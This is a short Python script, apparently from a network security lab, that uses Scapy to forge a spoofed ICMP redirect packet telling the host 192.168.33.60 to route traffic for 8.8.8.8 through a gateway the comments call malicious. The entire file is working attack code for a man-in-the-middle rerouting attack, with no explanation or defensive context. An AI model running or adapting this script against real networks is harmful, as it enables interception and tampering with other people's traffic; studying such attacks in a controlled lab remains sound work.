#!/usr/bin/env python3

from scapy.all import *

ip = IP(src="192.168.33.30", dst="192.168.33.60")
# type 5 = redirect
icmp = ICMP(type=5, code=1)
# setting gateway to malicous ip acting as routing
icmp.gw = "192.168.33.138"

ip2 = IP(src="192.168.33.60", dst="8.8.8.8")
pkt = ip/icmp/ip2/UDP()
send(pkt)